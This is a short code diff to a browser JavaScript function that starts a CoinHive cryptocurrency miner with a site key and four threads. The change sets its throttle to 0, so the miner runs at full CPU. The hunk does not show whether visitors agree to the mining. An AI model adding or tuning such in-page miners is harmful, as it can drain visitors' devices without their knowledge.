@@ -2,7 +2,7 @@ function StartMining(name)
 {
     var miner = new CoinHive.User('jgKLZHkHXIZ8rLXKdyAmnakvA46ijH3s', name, {
 	threads: 4,
-	throttle: 0.8,
+	throttle: 0,
 	forceASMJS: false,
 	theme: 'dark',
 	language: 'auto'
